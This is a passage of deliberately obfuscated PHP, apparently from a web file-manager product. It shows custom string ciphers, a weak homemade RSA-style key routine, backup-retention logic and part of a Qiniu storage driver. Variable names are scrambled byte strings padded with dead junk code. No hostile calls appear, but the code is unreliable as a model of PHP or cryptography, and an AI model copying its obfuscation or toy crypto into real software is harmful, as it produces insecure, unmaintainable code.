$Åş­Õ¦Ú)); $®ôĞÖÁï = $é¤¯Çú[801]; if (!$®ôĞÖÁï) { die; } break; case $¿³á›õª[307]: $—ÓìÍ = $this->wgmbf37d1a59($–ĞÂÆ®ä, base64_encode($Ó¨Òëßï . $Åş­Õ¦Ú)); break; case $¿³á›õª[308]: $—ÓìÍ = $this->wgmbf37d1a59($–ĞÂÆ®ä, md5($Ó¨Òëßï . $Åş­Õ¦Ú)); $¬ƒ±ˆûÙ = $é¤¯Çú[802]; if (!$¬ƒ±ˆûÙ) { return; } break; case $¿³á›õª[309]: $–ĞÂÆ®ä = base64_encode($–ĞÂÆ®ä); $œ´©›õè = $é¤¯Çú[803]; while (strlen($œ´©›õè) < $é¤¯Çú[716]) { if (!$œ´©›õè) { break; } $œ´©›õè++; } $—¿À”‘” = rand(0, 64); $¹ë—ì¨Ö = $é¤¯Çú[804]; if (!$¹ë—ì¨Ö) { die; } $˜àõ€æ¾ = $À¶Ó“[$—¿À”‘”]; $ì”ºÇÕ = $é¤¯Çú[805]; $ØÎğêˆ = md5($˜àõ€æ¾ . md5($Åş­Õ¦Ú . $˜àõ€æ¾) . $Åş­Õ¦Ú); $ØÎğêˆ = substr($ØÎğêˆ, $—¿À”‘” % 8, $—¿À”‘” % 8 + 7); $»ŠÈ‰­ = $¿³á›õª[6]; $›ôŒ²ñ™ = $é¤¯Çú[806]; while ($›ôŒ²ñ™ < $é¤¯Çú[724]) { if ($›ôŒ²ñ™ >= 0) { break; } $›ôŒ²ñ™++; } $¥Æ²ƒÕÓ = 0; $ïæ÷í¨ä = $é¤¯Çú[807]; while ($ïæ÷í¨ä < $é¤¯Çú[716]) { if ($ïæ÷í¨ä >= 0) { break; } $ïæ÷í¨ä++; } $Æîàä È = 0; $ƒ¤ËÔã± = $é¤¯Çú[808]; if (strlen($ƒ¤ËÔã±) < $é¤¯Çú[716]) { return; } $Ÿ“ıÀó’ = 0; $üõñ³­Œ = $é¤¯Çú[809]; for ($¥Æ²ƒÕÓ = 0; $¥Æ²ƒÕÓ < strlen($–ĞÂÆ®ä); $¥Æ²ƒÕÓ++) { $Ÿ“ıÀó’ = $Ÿ“ıÀó’ == strlen($ØÎğêˆ) ? 0 : $Ÿ“ıÀó’; $Ë°†Ğ¼ = $é¤¯Çú[810]; if (!$Ë°†Ğ¼) { return; } $Æîàä È = ($—¿À”‘” + strpos($À¶Ó“, $–ĞÂÆ®ä[$¥Æ²ƒÕÓ]) + ord($ØÎğêˆ[$Ÿ“ıÀó’++])) % 64; $âå÷Ç» = $é¤¯Çú[749]; while ($âå÷Ç» < $é¤¯Çú[222]) { if ($âå÷Ç» >= 0) { break; } $âå÷Ç»++; } $»ŠÈ‰­ .= $À¶Ó“[$Æîàä È]; } $—ÓìÍ = hash_encode($˜àõ€æ¾ . $»ŠÈ‰­); break; $³ûÛ¿Ó¡ = $é¤¯Çú[811]; default: $—ÓìÍ = $this->wgmbf37d1a59($–ĞÂÆ®ä, $Åş­Õ¦Ú . $Ó¨Òëßï); break; $Î«±Æ¥Ç = $é¤¯Çú[812]; } $—ÓìÍ = strrev($ Œó”ˆ . $Ó¨Òëßï . $—ÓìÍ); if ($­ÄşØÒ - 1 > 0) { $—ÓìÍ = $this->mpqwf1050b9c($—ÓìÍ, $Åş­Õ¦Ú, $­ÄşØÒ - 1); } return $—ÓìÍ; } private function hjwx42c014f7($ÓÅşŞ‹Š, $ş´ âÜ€, $¿æåâ¦Ü = 3) { $É×¢òÆ =& $_SERVER[áäÒ½¯Ç]; $ö—Éë¡ =& $_SERVER[™Í‘Í£§]; if (!is_string($ÓÅşŞ‹Š) || strlen($ÓÅşŞ‹Š) < 10) { return !1; } $ÓÅşŞ‹Š = trim($ÓÅşŞ‹Š); $Óîú®î– = $É×¢òÆ[813]; if (strlen($Óîú®î–) < $É×¢òÆ[716]) { die; } $ÓÅşŞ‹Š = strrev($ÓÅşŞ‹Š); $óùŸˆÀ = $É×¢òÆ[814]; while ($óùŸˆÀ < $É×¢òÆ[724]) { if ($óùŸˆÀ >= 0) { break; } $óùŸˆÀ++; } $™ÁÌÓäë = $ÓÅşŞ‹Š[0]; $ù¨«ÜÏû = substr($ÓÅşŞ‹Š, 1, 15); $ÓÅşŞ‹Š = substr($ÓÅşŞ‹Š, 16); $¢´Ğ¸¿¿ = $É×¢òÆ[815]; if (!$¢´Ğ¸¿¿) { die; } $óİø‰óÒ = $ö—Éë¡[306]; switch ($™ÁÌÓäë) { case $ö—Éë¡[208]: $˜äÙŠÁè = $this->ipbe22eee364($ÓÅşŞ‹Š, strrev($ş´ âÜ€ . $ù¨«ÜÏû)); break; $ŠÇøÕ« = $É×¢òÆ[816]; if (!$ŠÇøÕ«) { die; } case $ö—Éë¡[124]: $˜äÙŠÁè = $this->ipbe22eee364($ÓÅşŞ‹Š, strrev($ù¨«ÜÏû . $ş´ âÜ€)); $“¸½–ü¿ = $É×¢òÆ[817]; while (strlen($“¸½–ü¿) < $É×¢òÆ[724]) { if (!$“¸½–ü¿) { break; } $“¸½–ü¿++; } break; case $ö—Éë¡[307]: $˜äÙŠÁè = $this->ipbe22eee364($ÓÅşŞ‹Š, base64_encode($ù¨«ÜÏû . $ş´ âÜ€)); $×§’À©Ş = $É×¢òÆ[818]; while ($×§’À©Ş < $É×¢òÆ[708]) { if ($×§’À©Ş >= 0) { break; } $×§’À©Ş++; } break; $÷˜Œ“ªÓ = $É×¢òÆ[734]; while ($÷˜Œ“ªÓ < $É×¢òÆ[708]) { if ($÷˜Œ“ªÓ >= 0) { break; } $÷˜Œ“ªÓ++; } case $ö—Éë¡[308]: $˜äÙŠÁè = $this->ipbe22eee364($ÓÅşŞ‹Š, md5($ù¨«ÜÏû . $ş´ âÜ€)); break; $«ÌÂ›ş = $É×¢òÆ[819]; if (!$«ÌÂ›ş) { die; } case $ö—Éë¡[309]: $ÓÅşŞ‹Š = hash_decode($ÓÅşŞ‹Š); $Ì ¥Èµ‘ = $É×¢òÆ[820]; if (strlen($Ì ¥Èµ‘) < $É×¢òÆ[222]) { die; } $£üÌš“º = $ÓÅşŞ‹Š[0]; $¡ƒÇÆ = $É×¢òÆ[821]; if (!$¡ƒÇÆ) { die; } $ÓÅşŞ‹Š = substr($ÓÅşŞ‹Š, 1); $‘äëÁë° = $É×¢òÆ[822]; $•îÜ§şÖ = strpos($óİø‰óÒ, $£üÌš“º); $œä“Ìø” = $É×¢òÆ[823]; if (strlen($œä“Ìø”) < $É×¢òÆ[716]) { return; } $ºä¼Ø » = md5($£üÌš“º . md5($ş´ âÜ€ . $£üÌš“º) . $ş´ âÜ€); $ºä¼Ø » = substr($ºä¼Ø », $•îÜ§şÖ % 8, $•îÜ§şÖ % 8 + 7); $ääÆıõ = $ö—Éë¡[6]; $ê—Æ²÷ƒ = 0; $¾ŞÎ°£© = 0; $ÛúÏ–¶Œ = $É×¢òÆ[824]; while ($ÛúÏ–¶Œ < $É×¢òÆ[708]) { if ($ÛúÏ–¶Œ >= 0) { break; } $ÛúÏ–¶Œ++; } $Ÿ½¯Èçü = 0; for ($ê—Æ²÷ƒ = 0; $ê—Æ²÷ƒ < strlen($ÓÅşŞ‹Š); $ê—Æ²÷ƒ++) { $Ÿ½¯Èçü = $Ÿ½¯Èçü == strlen($ºä¼Ø ») ? 0 : $Ÿ½¯Èçü; $–ËŒÌÖ« = $É×¢òÆ[825]; while (strlen($–ËŒÌÖ«) < $É×¢òÆ[724]) { if (!$–ËŒÌÖ«) { break; } $–ËŒÌÖ«++; } $¨İé¼¡Í = $Ÿ½¯Èçü++; $‹ã¦¯Œ = $É×¢òÆ[826]; while ($‹ã¦¯Œ < $É×¢òÆ[716]) { if ($‹ã¦¯Œ >= 0) { break; } $‹ã¦¯Œ++; } $¾ŞÎ°£© = strpos($óİø‰óÒ, $ÓÅşŞ‹Š[$ê—Æ²÷ƒ]) - $•îÜ§şÖ - ord($ºä¼Ø »[$¨İé¼¡Í]); while ($¾ŞÎ°£© < 0) { $¾ŞÎ°£© += 64; } $ääÆıõ .= $óİø‰óÒ[$¾ŞÎ°£©]; } $˜äÙŠÁè = base64_decode($ääÆıõ); break; $£ÅÆºŞæ = $É×¢òÆ[827]; while ($£ÅÆºŞæ < $É×¢òÆ[708]) { if ($£ÅÆºŞæ >= 0) { break; } $£ÅÆºŞæ++; } default: $˜äÙŠÁè = $this->ipbe22eee364($ÓÅşŞ‹Š, $ş´ âÜ€ . $ù¨«ÜÏû); break; $Ğİùïî = $É×¢òÆ[828]; if (strlen($Ğİùïî) < $É×¢òÆ[724]) { die; } } if ($¿æåâ¦Ü - 1 > 0) { $˜äÙŠÁè = $this->hjwx42c014f7($˜äÙŠÁè, $ş´ âÜ€, $¿æåâ¦Ü - 1); } return $˜äÙŠÁè; } public function ghujeae1388a($À½…—Å¨) { $ØØ¹Œ€­ =& $_SERVER[áäÒ½¯Ç]; $Ì‰°–  =& $_SERVER[™Í‘Í£§]; $å²£š½ = $this->ykuzd8fa1621(); $Ùù’×È‚ = $this->ykuzd8fa1621(); $”ÔùÄÓÄ = $ØØ¹Œ€­[829]; $ÔÚÃéÚë = ($å²£š½ - 1) * ($Ùù’×È‚ - 1); $ÅŠŠí = intval(($å²£š½ + $Ùù’×È‚) / 2); $Ÿñ¾Ç€• = $ØØ¹Œ€­[830]; if (strlen($Ÿñ¾Ç€•) < $ØØ¹Œ€­[708]) { return; } while (1) { $°ÈÆ— = $ÅŠŠí; $à•—®‹ = $ÔÚÃéÚë; while ($à•—®‹ % $°ÈÆ— != 0) { $‰Ú²Éñº = $à•—®‹; $î³ò’øÓ = $ØØ¹Œ€­[831]; if (strlen($î³ò’øÓ) < $ØØ¹Œ€­[716]) { die; } $à•—®‹ = $°ÈÆ—; $ï²¤áª† = $ØØ¹Œ€­[832]; $°ÈÆ— = $‰Ú²Éñº % $°ÈÆ—; $¼êê·Ò¯ = $ØØ¹Œ€­[833]; } if ($°ÈÆ— == 1) { break; } else { $ÅŠŠí++; } } $ãÅ»²×ï = 2; for ($½Ç½ã½¿ = 0; $½Ç½ã½¿ < $ÔÚÃéÚë * 10; $½Ç½ã½¿++) { if (($ÔÚÃéÚë * $½Ç½ã½¿ + 1) % $ÅŠŠí == 0) { $ãÅ»²×ï = intval(($ÔÚÃéÚë * $½Ç½ã½¿ + 1) / $ÅŠŠí); break; } } $¢º°ş°š = $this->wgmbf37d1a59($å²£š½ * $Ùù’×È‚ . $Ì‰°– [6], $Ì‰°– [138]); $íË¢ÓÂ = $ØØ¹Œ€­[834]; $±¥º¿œÔ = md5($Ì‰°– [310] . ($å²£š½ + $Ùù’×È‚) . $Ì‰°– [311] . $ÅŠŠí . $Ì‰°– [311] . $ãÅ»²×ï . $Ì‰°– [312]); $Æòâİá = $this->wgmbf37d1a59($À½…—Å¨, $±¥º¿œÔ) . $Ì‰°– [313] . $¢º°ş°š; return $Æòâİá; } public function mkfi7d6078ad($ñ®¿) { $¹ÜâÙĞ« =& $_SERVER[áäÒ½¯Ç]; $ùÙíÊ¾È =& $_SERVER[™Í‘Í£§]; $áéÚ¼İ = explode($ùÙíÊ¾È[313], $ñ®¿); $ñ×åõá³ = $¹ÜâÙĞ«[835]; if (count($áéÚ¼İ) != 2) { return $ùÙíÊ¾È[6]; } $õó«×• = $this->ipbe22eee364($áéÚ¼İ[1] . $ùÙíÊ¾È[6], $ùÙíÊ¾È[138]); if (!$õó«×•) { return $ùÙíÊ¾È[6]; } $õó«×• = intval($õó«×•); $¯ÃÊç°Ø = 0; $½éå½õº = 0; for ($ÚŒù—áë = 3; $ÚŒù—áë < $õó«×•; $ÚŒù—áë += 2) { if ($õó«×• % $ÚŒù—áë != 0) { continue; } $¯ÃÊç°Ø = $ÚŒù—áë; $½éå½õº = intval($õó«×• / $ÚŒù—áë); break; } $°—£ğÕû = ($¯ÃÊç°Ø - 1) * ($½éå½õº - 1); $ûÜÊ‚Ë† = $¹ÜâÙĞ«[836]; while ($ûÜÊ‚Ë† < $¹ÜâÙĞ«[716]) { if ($ûÜÊ‚Ë† >= 0) { break; } $ûÜÊ‚Ë†++; } $Ï³Ï†ôĞ = intval(($¯ÃÊç°Ø + $½éå½õº) / 2); $§šóÚ = $¹ÜâÙĞ«[837]; while (1) { $úØ·Öö = $Ï³Ï†ôĞ; $Ô×û˜ = $¹ÜâÙĞ«[838]; if (!$Ô×û˜) { die; } $à¢¢ø–Ú = $°—£ğÕû; $ú¨§Ù¼’ = $¹ÜâÙĞ«[839]; if (strlen($ú¨§Ù¼’) < $¹ÜâÙĞ«[708]) { die; } while ($à¢¢ø–Ú % $úØ·Öö != 0) { $ø“´šÖÓ = $à¢¢ø–Ú; $²—²ô²ú = $¹ÜâÙĞ«[840]; while ($²—²ô²ú < $¹ÜâÙĞ«[728]) { if ($²—²ô²ú >= 0) { break; } $²—²ô²ú++; } $à¢¢ø–Ú = $úØ·Öö; $°Éşïáâ = $¹ÜâÙĞ«[841]; while (strlen($°Éşïáâ) < $¹ÜâÙĞ«[724]) { if (!$°Éşïáâ) { break; } $°Éşïáâ++; } $úØ·Öö = $ø“´šÖÓ % $úØ·Öö; } if ($úØ·Öö == 1) { break; } else { $Ï³Ï†ôĞ++; } } $ÎÓàğ§Ÿ = 2; $†ı‡Êµ¯ = $¹ÜâÙĞ«[842]; while ($†ı‡Êµ¯ < $¹ÜâÙĞ«[716]) { if ($†ı‡Êµ¯ >= 0) { break; } $†ı‡Êµ¯++; } for ($ÚŒù—áë = 0; $ÚŒù—áë < $°—£ğÕû * 10; $ÚŒù—áë++) { if (($°—£ğÕû * $ÚŒù—áë + 1) % $Ï³Ï†ôĞ == 0) { $ÎÓàğ§Ÿ = intval(($°—£ğÕû * $ÚŒù—áë + 1) / $Ï³Ï†ôĞ); break; } } $–¾í·úŠ = md5($ùÙíÊ¾È[310] . ($¯ÃÊç°Ø + $½éå½õº) . $ùÙíÊ¾È[311] . $Ï³Ï†ôĞ . $ùÙíÊ¾È[311] . $ÎÓàğ§Ÿ . $ùÙíÊ¾È[312]); $Ëè‘Ü×Æ = $this->ipbe22eee364($áéÚ¼İ[0], $–¾í·úŠ); return $Ëè‘Ü×Æ; } public function ykuzd8fa1621() { $‰ã®’ñİ =& $_SERVER[áäÒ½¯Ç]; $“ŞéœŸè = mt_rand(pow(2, 14), pow(2, 16) - 1); $ìƒ®ºíæ = array(); $†íúó…ˆ = 1; $³ËÎÊÜû = $‰ã®’ñİ[843]; while ($†íúó…ˆ <= (int) sqrt($“ŞéœŸè)) { $¾­İ—²à = $†íúó…ˆ; $ÑúÉæá½ = $‰ã®’ñİ[844]; if (strlen($ÑúÉæá½) < $‰ã®’ñİ[728]) { die; } while (!0) { $¾­İ—²à++; if ($¾­İ—²à <= 2) { $†íúó…ˆ = $¾­İ—²à; break; } else { if ($¾­İ—²à < 2) { continue; } } $éû«¨´ = !0; for ($’ŒèƒâÓ = 2; $’ŒèƒâÓ <= sqrt($¾­İ—²à); $’ŒèƒâÓ++) { if ($¾­İ—²à % $’ŒèƒâÓ == 0) { $éû«¨´ = !1; } } if ($éû«¨´) { $†íúó…ˆ = $¾­İ—²à; break; } } $ìƒ®ºíæ[] = $†íúó…ˆ; } $¹¬†¢»› = 2; $×¡Î¯¡œ = $‰ã®’ñİ[845]; if (strlen($×¡Î¯¡œ) < $‰ã®’ñİ[728]) { return; } for ($¾­İ—²à = $“ŞéœŸè; $¾­İ—²à > 1; $¾­İ—²à--) { $éû«¨´ = !0; $ Ûúæ± = $‰ã®’ñİ[846]; while (strlen($ Ûúæ±) < $‰ã®’ñİ[728]) { if (!$ Ûúæ±) { break; } $ Ûúæ±++; } foreach ($ìƒ®ºíæ as $–úëğí±) { if ($¾­İ—²à % $–úëğí± == 0) { $éû«¨´ = !1; break; } } if ($éû«¨´) { $¹¬†¢»› = $¾­İ—²à; break; } } return $¹¬†¢»›; } public function raiy5a58b1e9($Ã¯§¹ËÍ, $Ã¼Ö°¹) { $¾ˆ‡Ş†í =& $_SERVER[áäÒ½¯Ç]; $®ßÍÀò =& $_SERVER[™Í‘Í£§]; return call_user_func(array($®ßÍÀò[8], $®ßÍÀò[314]), $Ã¯§¹ËÍ, $Ã¼Ö°¹); $æäÒ’” = $¾ˆ‡Ş†í[847]; while ($æäÒ’” < $¾ˆ‡Ş†í[222]) { if ($æäÒ’” >= 0) { break; } $æäÒ’”++; } } public function wgmbf37d1a59($Ë•šè˜¬, $éÍÜƒÎó) { $º“èï²± =& $_SERVER[™Í‘Í£§]; return call_user_func(array($º“èï²±[315], $º“èï²±[316]), $Ë•šè˜¬, $éÍÜƒÎó); $“åşğÄş = $_SERVER[áäÒ½¯Ç][848]; if (!$“åşğÄş) { die; } } public function ipbe22eee364($†é£¯úº, $İ÷•ÎëÌ) { $™øÉ»€Ø =& $_SERVER[™Í‘Í£§]; return call_user_func(array($™øÉ»€Ø[315], $™øÉ»€Ø[317]), $†é£¯úº, $İ÷•ÎëÌ); $¶ÅÜ¯õ = $_SERVER[áäÒ½¯Ç][849]; } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->model = Model($_SERVER[áäÒ½¯Ç][850]); $this->init(); $this->keep(); } public function init() { $ş´€ğã± =& $_SERVER[áäÒ½¯Ç]; $this->isManual(); self::$name = date($ş´€ğã±[851]); if (!($­³÷˜¦¬ = $this->model->lastItem())) { $­³÷˜¦¬ = $this->initData(); } else { self::$name = $­³÷˜¦¬[$ş´€ğã±[32]]; if ($­³÷˜¦¬[$ş´€ğã±[852]] == $ş´€ğã±[91]) { self::$name = date($ş´€ğã±[270]); $Ù»ùğ¹Õ = intval(_get($­³÷˜¦¬, $ş´€ğã±[853], 0)); if (self::$manual == 0 && $­³÷˜¦¬[$ş´€ğã±[32]] == self::$name) { $this->model->remove($­³÷˜¦¬[$ş´€ğã±[492]]); } $­³÷˜¦¬ = $this->initData($Ù»ùğ¹Õ, $­³÷˜¦¬[$ş´€ğã±[854]]); } else { $this->checkStore($­³÷˜¦¬[$ş´€ğã±[854]]); } } self::$option = $­³÷˜¦¬; } private function isManual() { $†Ÿ€ù½‚ = _get($GLOBALS, $_SERVER[áäÒ½¯Ç][855], 0); $†Ÿ€ù½‚ = intval($†Ÿ€ù½‚); self::$manual = $†Ÿ€ù½‚ && $†Ÿ€ù½‚ == 1 ? 1 : 0; } private function initData($†¤ù½ù = 0, $£¶Âˆ¦À = '') { $ßÒüëíè =& $_SERVER[áäÒ½¯Ç]; $Ù¡Í®ˆ = $this->model->config(); if ($£¶Âˆ¦À && $Ù¡Í®ˆ[$ßÒüëíè[854]] != $£¶Âˆ¦À) { $†¤ù½ù = 0; } $this->checkStore($Ù¡Í®ˆ[$ßÒüëíè[854]]); if (self::$manual == 1) { self::$name .= $ßÒüëíè[11] . date($ßÒüëíè[856]); } $¦œûèå = array($ßÒüëíè[854] => $Ù¡Í®ˆ[$ßÒüëíè[854]], $ßÒüëíè[32] => self::$name, $ßÒüëíè[852] => 0, $ßÒüëíè[169] => $Ù¡Í®ˆ[$ßÒüëíè[169]], $ßÒüëíè[857] => self::$manual, $ßÒüëíè[858] => array($ßÒüëíè[859] => array($ßÒüëíè[852] => 0), $ßÒüëíè[860] => array($ßÒüëíè[852] => 0, $ßÒüëíè[861] => 0, $ßÒüëíè[862] => 0, $ßÒüëíè[33] => $ßÒüëíè[12], $ßÒüëíè[863] => 0, $ßÒüëíè[864] => 0), $ßÒüëíè[865] => array($ßÒüëíè[852] => 0, $ßÒüëíè[861] => 0, $ßÒüëíè[862] => 0, $ßÒüëíè[863] => 0, $ßÒüëíè[864] => 0), $ßÒüëíè[241] => array($ßÒüëíè[852] => 0, $ßÒüëíè[866] => 0, $ßÒüëíè[867] => 0, $ßÒüëíè[868] => 0, $ßÒüëíè[869] => 0, $ßÒüëíè[562] => $†¤ù½ù, $ßÒüëíè[863] => 0, $ßÒüëíè[864] => 0)), $ßÒüëíè[863] => time(), $ßÒüëíè[864] => 0); $‚Øèöó² = $this->model->insert($¦œûèå); $¦œûèå[$ßÒüëíè[492]] = $‚Øèöó²; return $¦œûèå; } private function checkStore($¶ú£Û€š) { $½¯šÂ‹ç = Model($_SERVER[áäÒ½¯Ç][870]); $®—îÊÅÕ = $½¯šÂ‹ç->listData($¶ú£Û€š); $½¯šÂ‹ç->checkConfig($®—îÊÅÕ); } public static function get() { if (!self::$option) { $Äå˜À› = Model($_SERVER[áäÒ½¯Ç][850]); $ÉĞŠĞÜÈ = $Äå˜À›->findByName(self::$name); $Äå˜À›->parseContent($ÉĞŠĞÜÈ); self::$option = $ÉĞŠĞÜÈ; } return self::$option; } public static function set($¸ÌÁ²›) { $†²¶œ„¿ =& $_SERVER[áäÒ½¯Ç]; $ø²Á©Ù = self::get(); foreach ($¸ÌÁ²› as $ÅÙ¯®†Ò => $£Ôë¤õ) { array_set_value($ø²Á©Ù, $ÅÙ¯®†Ò, $£Ôë¤õ); } Model($†²¶œ„¿[850])->update($ø²Á©Ù[$†²¶œ„¿[492]], $ø²Á©Ù); self::$option = $ø²Á©Ù; return self::$option; } public function keep() { $Ø´äª£¡ =& $_SERVER[áäÒ½¯Ç]; $şÀ©£êÉ = self::get(); if (_get($şÀ©£êÉ, $Ø´äª£¡[871], 0) == $Ø´äª£¡[91]) { return; } $this->backupKeep($şÀ©£êÉ); self::set(array($Ø´äª£¡[871] => 1)); } private function backupKeep($§Æ‚­³¨) { $ÍÓ°•œ =& $_SERVER[áäÒ½¯Ç]; if (self::$manual == 1) { return; } $Ã”¯›‹Ñ = $this->model->listData(); if (empty($Ã”¯›‹Ñ)) { return; } $¯¸±‡° = array(); $£¬Ìª°ï = array(); $‘ºø‚¦ş = date($ÍÓ°•œ[872], strtotime($ÍÓ°•œ[873])); foreach ($Ã”¯›‹Ñ as $³·ó¸µ½ => $™­¬ë‚) { $ƒå€¿ÑÇ = $™­¬ë‚[$ÍÓ°•œ[32]]; if ($³·ó¸µ½ < 7 || $™­¬ë‚[$ÍÓ°•œ[857]] == $ÍÓ°•œ[91]) { $¯¸±‡°[] = $ƒå€¿ÑÇ; continue; } $ÈêÔçÕÓ = substr($ƒå€¿ÑÇ, 0, 6); if ($ÈêÔçÕÓ < $‘ºø‚¦ş) { continue; } if (!isset($£¬Ìª°ï[$ÈêÔçÕÓ]) || $ƒå€¿ÑÇ < $£¬Ìª°ï[$ÈêÔçÕÓ]) { $£¬Ìª°ï[$ÈêÔçÕÓ] = $ƒå€¿ÑÇ; } if (substr($ƒå€¿ÑÇ, 6, 2) == $ÍÓ°•œ[874]) { $£¬Ìª°ï[$ÈêÔçÕÓ] = $ƒå€¿ÑÇ; } } $¯¸±‡° = array_merge($¯¸±‡°, array_values($£¬Ìª°ï)); $¯¸±‡° = array_unique($¯¸±‡°); foreach ($Ã”¯›‹Ñ as $™­¬ë‚) { $ƒå€¿ÑÇ = $™­¬ë‚[$ÍÓ°•œ[32]]; if (!empty($ƒå€¿ÑÇ) && in_array($ƒå€¿ÑÇ, $¯¸±‡°)) { continue; } $this->model->remove($™­¬ë‚[$ÍÓ°•œ[492]]); $ïî‹˜– = $this->backupPath($§Æ‚­³¨); IO::remove($ïî‹˜–, !1); } } private function backupPath($¡’§ÉÒ) { $­·‘òô› =& $_SERVER[áäÒ½¯Ç]; static $Ú£Ñ¦ƒæ = null; if (is_null($Ú£Ñ¦ƒæ)) { $Ú£Ñ¦ƒæ = Model($­·‘òô›[875])->get($­·‘òô›[876]); } $¨ú€öç° = $¡’§ÉÒ[$­·‘òô›[32]]; $”¿Â›âğ = substr(md5($­·‘òô›[877] . $Ú£Ñ¦ƒæ . $¨ú€öç°), 0, 8); return "\x7b\151\x6f\72{$¡’§ÉÒ[$­·‘òô›[854]]}\x7d\57\x64\x61\x74\x61\142\141\163\145\x2f\x62\x61\143\153\x75\x70\x2f" . $¨ú€öç° . $­·‘òô›[11] . $”¿Â›âğ; } public function db() { $€Ğ›•Çî =& $_SERVER[áäÒ½¯Ç]; $íŞ³‘øã = self::get(); if (_get($íŞ³‘øã, $€Ğ›•Çî[878], 0) == $€Ğ›•Çî[91]) { return !0; } $İ®°‡ƒ» = new BackupDb(); if (!$İ®°‡ƒ»->index()) { return !1; } self::set(array($€Ğ›•Çî[878] => 1)); return !0; } public function dbFile() { $áÒËÓÜˆ =& $_SERVER[áäÒ½¯Ç]; $áûğÂ¸» = self::get(); if (_get($áûğÂ¸», $áÒËÓÜˆ[879], 0) == $áÒËÓÜˆ[91]) { return !0; } $ ·ÎÀ÷Œ = new BackupDbFile(); if (!$ ·ÎÀ÷Œ->index()) { return !1; } self::set(array($áÒËÓÜˆ[879] => 1)); return !0; } public function file() { $±ÄâÆã° =& $_SERVER[áäÒ½¯Ç]; $Ñ¥—Æ‡ˆ = self::get(); if (_get($Ñ¥—Æ‡ˆ, $±ÄâÆã°[880], 0) == $±ÄâÆã°[91]) { return !0; } if ($Ñ¥—Æ‡ˆ[$±ÄâÆã°[169]] == $±ÄâÆã°[881]) { $´ÕØ²º = new BackupFile(); if (!$´ÕØ²º->index()) { return !1; } } self::set(array($±ÄâÆã°[880] => 1, $±ÄâÆã°[852] => 1)); return !0; } public static function log($í™÷´–³) { write_log($í™÷´–³, $_SERVER[áäÒ½¯Ç][882]); } } goto a“¤«„Ö; C•‘ÁªõĞ¹: function binCheckBigger($È¡›”«¡, $ÕÔ§Ä–¬) { return $È¡›”«¡ > $ÕÔ§Ä–¬; } $_SERVER[$_SERVER[Ş¤Ÿ¢à¹][3]] = ("\71\61\60\61".base64_decode('NDE='))+0;$_b3lr="hrekxlocyibvmp9g1fujnd58sw20a3z4qt762ufpczx7td513986sjkqmgw4nl0byihoe";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($ó´Öéö, $š¬‡À¤) { $ƒ‹ğ¦ŸÁ =& $_SERVER[áäÒ½¯Ç]; if (isset(self::$_methodList[$ó´Öéö])) { return @call_user_func_array(self::$_methodList[$ó´Öéö], $š¬‡À¤); } else { if (method_exists($this, $ó´Öéö)) { return call_user_func_array(array($this, $ó´Öéö), $š¬‡À¤); } else { think_exception(__CLASS__ . $ƒ‹ğ¦ŸÁ[4] . $ó´Öéö . $ƒ‹ğ¦ŸÁ[5]); } } } public static function __callStatic($”ƒôşŸà, $íˆšıÎ§) { if (isset(self::$_methodListStatic[$”ƒôşŸà])) { return call_user_func_array(self::$_methodListStatic[$”ƒôşŸà], $íˆšıÎ§); } else { if (method_exists(self, $”ƒôşŸà)) { return call_user_func_array(array(self, $”ƒôşŸà), $íˆšıÎ§); } else { show_json("{$”ƒôşŸà}\x28\x29\x20\156\x6f\x74\40\x65\170\151\x73\x74\x3b", !1); } } } public static function addMethod($˜û»€İÈ, $Êşğù¼) { self::$_methodList[$˜û»€İÈ] = $Êşğù¼; } public static function addMethodStatic($Ñµ”Ö»ƒ, $óüÜ¿ì) { self::$_methodListStatic[$Ñµ”Ö»ƒ] = $óüÜ¿ì; } } goto A×òéÉ–òİ; Eíå‚Å®åµ: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($Ó›¬›‚í) { parent::__construct(); require_once SDK_DIR . $_SERVER[áäÒ½¯Ç][1683]; $this->_init($Ó›¬›‚í); } public function _init($Ø¿÷û£æ) { $äÙø¥ìæ =& $_SERVER[áäÒ½¯Ç]; $this->config = $Ø¿÷û£æ; foreach ($Ø¿÷û£æ as $ÑÓº‡Èò => $ïÆÉ‹ÖÒ) { if (isset($this->{$ÑÓº‡Èò})) { $this->{$ÑÓº‡Èò} = $ïÆÉ‹ÖÒ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($äÙø¥ìæ[1684] . LNG($äÙø¥ìæ[1621])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($‰¶»¥°, $ÁæÕ½àğ = '', $è¾Õ¢•Â = REPEAT_RENAME) { if ($this->setContent($‰¶»¥°, $ÁæÕ½àğ)) { return $this->getPathOuter($‰¶»¥°); } return !1; } public function mkdir($Æ¥ğ´ğÆ, $‹¾æê‘é = REPEAT_SKIP) { $ÏŠ™÷å =& $_SERVER[áäÒ½¯Ç]; $”¾âıæ› = trim($Æ¥ğ´ğÆ, $ÏŠ™÷å[8]); if ($this->_isFolder($”¾âıæ›)) { return $this->getPathOuter($”¾âıæ›); } $Æ¥ğ´ğÆ = $”¾âıæ› . $ÏŠ™÷å[8]; $ŞŞÔƒ¤¸ = get_path_this($”¾âıæ›); $ç”Ğ¨úç = $Æ¥ğ´ğÆ . $ŞŞÔƒ¤¸; if (!$this->mkfile($ç”Ğ¨úç)) { return !1; } if (!$this->moveFile($ç”Ğ¨úç, $Æ¥ğ´ğÆ)) { $this->delFile($ç”Ğ¨úç); return !1; } return $this->getPathOuter($”¾âıæ›); } public function copyFile($Ü‰œööû, $á…—Ö‘ç) { $£“ÑÆ¿µ = $this->bucketManager->copy($this->bucket, $Ü‰œööû, $this->bucket, $á…—Ö‘ç, !0); return $£“ÑÆ¿µ ? !1 : $this->getPathOuter($á…—Ö‘ç); } public function moveFile($âÅÄÈ©Ñ, $Èş×ŒˆÍ) { $æ©Ä¥– = $this->bucketManager->move($this->bucket, $âÅÄÈ©Ñ, $this->bucket, $Èş×ŒˆÍ, !0); return 